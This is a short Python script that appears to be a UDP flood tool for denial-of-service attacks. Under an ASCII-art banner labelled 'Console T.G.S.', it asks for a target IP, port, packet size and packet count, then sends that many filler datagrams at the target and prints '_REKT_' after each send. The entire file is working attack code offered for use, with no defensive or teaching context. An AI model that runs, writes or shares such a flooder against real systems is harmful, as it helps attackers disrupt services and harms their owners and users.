import socket

def color_red(text):
    RED = "\033[91m" 
    RESET = "\033[0m" 
    return f"{RED}{text}{RESET}" 

def create_message(size):
    return b'X' * size 

print(color_red("""          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX' Console  `98v8P'  T.G.S.  `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '

"""))

UDP_IP = input(color_red("Enter the target IP address (e.g., 127.0.0.1): "))
UDP_PORT = int(input(color_red("Enter the target port (e.g., 5005): ")))
packet_size = int(input(color_red("Enter the packet size in bytes (1 - 65507): ")))
amount = int(input(color_red("Enter the number of packets to send: ")))

MESSAGE = create_message(packet_size)

print(color_red("UDP target IP: %s" % UDP_IP))
print(color_red("UDP target port: %s" % UDP_PORT))
print(color_red("Message size: %s bytes" % packet_size))
print(color_red("Number of packets to send: %s" % amount))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for i in range(amount):
    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
    print(f"{i + 1}" + color_red("_REKT_") + f"{i + 1}" + color_red("_REKT_") + f"{i + 1}" + color_red("_REKT_") + f"{i + 1}")

print("~DONE~")
